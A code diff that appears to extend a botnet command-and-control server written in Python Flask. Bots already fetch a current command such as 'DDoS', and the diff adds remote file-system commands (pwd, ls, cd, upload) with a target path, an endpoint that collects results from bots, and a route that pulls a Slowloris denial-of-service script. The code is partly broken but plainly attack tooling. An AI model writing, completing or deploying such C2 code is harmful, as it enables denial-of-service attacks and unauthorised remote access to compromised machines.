@@ -4,9 +4,10 @@ import os
 
 SLPort = "8888"
 
-avail_commands = ["Standby", "DDoS"]
+avail_commands = ["Standby", "DDoS", "pwd", "ls", "cd", "upload"]
 
-current_command = "DDoS"
+current_command = "pwd"
+path = "/"
 
 app = Flask(__name__)
 
@@ -22,14 +23,43 @@ def get_script():
 
 @app.route('/set_action', methods = ['POST'])
 def set_action():
-    body = request.get_json()
-    if "command" in body and body["command"] in avail_commands:
-        current_command = body["command"]
+	global current_command
+	global path
+	body = request.get_json()
+	print(body['command'], body['path'])
+	if "command" in body and body["command"] in avail_commands:
+		current_command = body["command"]
+		print(current_command)
+		if 'path' in body:
+			path = body['path']
+		else:
+			path = ''
 
+	return '200'
+
+
+@app.route("/result", methods = ['POST'])
+def result():
+	body = request.get_json()
+	print(body)
+	return body
+
+@app.route("/repository", methods = ['POST'])
+def repository():
+	# while 1:
+    #     try:
+	r = requests.get("http://" + Flask.request.remote_addr, stream=True)
+	print(r)
+        #     with open('slowloris.py', 'wb') as out_file:
+        #         shutil.copyfileobj(r.raw, out_file)
+        #     return
+        # except Exception:
+        #     print("Error getting script from master")
+        #     continue
 
 @app.route('/get_command', methods = ['GET'])
 def get_command():
-    return current_command
+    return current_command + " " + path
 
 
 if __name__ == "__main__":
